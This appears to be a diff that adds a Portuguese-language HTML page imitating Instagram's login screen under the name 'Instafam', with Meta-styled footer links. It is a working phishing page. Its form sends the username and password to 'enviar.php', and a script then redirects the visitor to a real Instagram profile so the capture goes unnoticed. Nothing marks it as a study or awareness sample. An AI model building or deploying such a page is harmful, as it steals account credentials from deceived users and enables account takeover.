@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Instafam</title>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      padding: 40px 20px;
+      width: 350px;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 54px;
+      margin-bottom: 30px;
+      color: #fff;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #262626;
+      border-radius: 4px;
+      background-color: #121212;
+      color: #fff;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    .login-btn {
+      background-color: #405de6;
+      color: white;
+      font-weight: bold;
+      border: none;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 14px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #333;
+    }
+
+    .divider span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-weight: 500;
+      font-size: 13px;
+    }
+
+    .facebook-login {
+      color: #0095f6;
+      font-weight: bold;
+      margin: 15px 0 10px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      font-size: 12px;
+      margin-top: 10px;
+      color: #b3b3b3;
+      cursor: pointer;
+    }
+
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .footer {
+      margin-top: 60px;
+      width: 100%;
+      max-width: 800px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .footer-links a {
+      color: #666;
+      text-decoration: none;
+    }
+
+    .footer-bottom {
+      color: #666;
+      font-size: 11px;
+      margin-bottom: 30px;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        width: 90%;
+      }
+
+      .footer-links {
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instafam</div>
+
+    <form id="loginForm" method="POST" action="enviar.php" onsubmit="return redirecionarInstagram()">
+
+      <input type="text" name="usuario" placeholder="Telefone, nome de usuário ou email" required>
+      <input type="password" name="senha" placeholder="Senha" required>
+      <button type="submit" class="login-btn">Entrar</button>
+    </form>
+
+    <div class="divider"><span>OU</span></div>
+
+    <div class="facebook-login">Entrar com o Facebook</div>
+    <div class="forgot">Esqueceu a senha?</div>
+
+    <div class="signup">
+      Não tem uma conta? <a href="#">Cadastre-se</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Meta</a>
+      <a href="#">Sobre</a>
+      <a href="#">Blog</a>
+      <a href="#">Carreiras</a>
+      <a href="#">Ajuda</a>
+      <a href="#">API</a>
+      <a href="#">Privacidade</a>
+      <a href="#">Termos</a>
+      <a href="#">Localizações</a>
+      <a href="#">Instafam Lite</a>
+      <a href="#">Threads</a>
+      <a href="#">Upload de contatos e não usuários</a>
+      <a href="#">Instafam Verificado</a>
+    </div>
+    <div class="footer-bottom">
+      Português (Brasil) ⌄ &nbsp;&nbsp; © 2025 Instafam from Meta
+    </div>
+  </div>
+
+  <script>
+    function redirecionarInstagram() {
+      setTimeout(function () {
+        window.location.href = "https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA%3D%3D#";
+      }, 300);
+      return true; // Permite envio do formulário
+    }
+  </script>
+</body>
+</html>
